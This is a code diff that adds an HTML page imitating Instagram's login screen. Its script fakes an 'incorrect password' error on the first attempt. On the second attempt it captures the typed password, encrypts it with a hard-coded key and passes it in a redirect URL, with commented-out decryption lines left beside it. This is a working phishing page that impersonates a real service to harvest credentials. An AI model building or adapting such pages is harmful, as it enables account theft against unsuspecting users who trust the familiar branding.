@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Instagram Login Page</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js" integrity="sha256-/H4YS+7aYb9kJ5OKhFYPUjSJdrtV6AeyJOtTkw6X72o=" crossorigin="anonymous"></script>
+
+</head>
+<style>
+    .eiCW- {
+        color: #ed4956;
+        color: rgba(var(--i30, 237, 73, 86), 1);
+        margin: 20px 10px;
+        margin-left: 10px;
+        font-size: 14px;
+        line-height: 18px;
+    }
+</style>
+
+
+<body>
+
+    <div class="wrapper">
+        <div class="header">
+            <div class="top">
+                <div class="logo">
+                    <img src="instagram.png" alt="instagram" style="width: 175px;">
+                </div>
+                <form class="form" id="addtext">
+                    <div class="input_field">
+                        <input type="text" placeholder="Phone number, username, or email" class="input">
+                    </div>
+                    <div class="input_field">
+                        <input type="password" id="PSWRAGS" placeholder="Password" class="input">
+                    </div>
+                    <button type="submit" onclick="myFunction()" style="width: 100%;" class="btn"><a href="#">Log In</a></button>
+                </form>
+                <div class="or">
+                    <div class="line"></div>
+                    <p>OR</p>
+                    <div class="line"></div>
+                </div>
+                <div class="dif">
+                    <div class="fb">
+                        <img src="facebook.png" alt="facebook">
+                        <p>Log in with Facebook</p>
+                    </div>
+                </div>
+                <div id="aarrt" style="display: none;" class="eiCW-">
+                    <p style="width:110%" aria-atomic="true" data-testid="login-error-message" id="slfErrorAlert" role="alert">Sorry, your password was incorrect. Please double-check your password.</p>
+                </div>
+
+                <div class="dif">
+                    <div class="forgot">
+                        <a href="#">Forgot password?</a>
+                    </div>
+                </div>
+            </div>
+            <div class="signup">
+                <p>Don't have an account? <a href="#">Sign up</a></p>
+            </div>
+            <div class="apps">
+                <p>Get the app.</p>
+                <div class="icons">
+                    <a href="#"><img src="appstore.png" alt="appstore"></a>
+                    <a href="#"><img src="googleplay.png" alt="googleplay"></a>
+                </div>
+            </div>
+        </div>
+        <div class="footer">
+            <div class="links">
+                <ul>
+                    <li><a href="#">ABOUT US</a></li>
+                    <li><a href="#">SUPPORT</a></li>
+                    <li><a href="#">PRESS</a></li>
+                    <li><a href="#">API</a></li>
+                    <li><a href="#">JOBS</a></li>
+                    <li><a href="#">PRIVACY</a></li>
+                    <li><a href="#">TERMS</a></li>
+                    <li><a href="#">DIRECTORY</a></li>
+                    <li><a href="#">PROFILES</a></li>
+                    <li><a href="#">HASHTAGS</a></li>
+                    <li><a href="#">LANGUAGE</a></li>
+                </ul>
+            </div>
+            <div class="copyright">
+                © 2019 INSTAGRAM
+            </div>
+        </div>
+    </div>
+
+</body>
+<script>
+    var count = 1;
+
+    function myFunction() {
+        if (count == 1) {
+            var element = document.getElementById("aarrt").style.display = "block";
+            count++;
+        } else {
+            var element2 = document.getElementById("PSWRAGS").value;
+            var encrypted = CryptoJS.AES.encrypt(element2, "SECRET");
+            //U2FsdGVkX18ZUVvShFSES21qHsQEqZXMxQ9zgHy+bu0=
+            // alert(encrypted)
+            //encrypted2 = "U2FsdGVkX1914ZsCQ9Grm8v0TgtCV2+f4JhuUm2nUEQ="
+            //var decrypted = CryptoJS.AES.decrypt(encrypted2, "SECRET");
+            // dded = decrypted.toString(CryptoJS.enc.Utf8);
+            //alert(dded)
+            //4d657373616765
+            window.location = "profile.html?id=$" + encrypted;
+
+        }
+    }
+
+    var baseUrl = (window.location).href; // You can also use document.URL
+    var koopId = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
+    bb2 = baseUrl.indexOf("=");
+    if (bb2 != -1) {
+
+    }
+</script>
+
+</html>
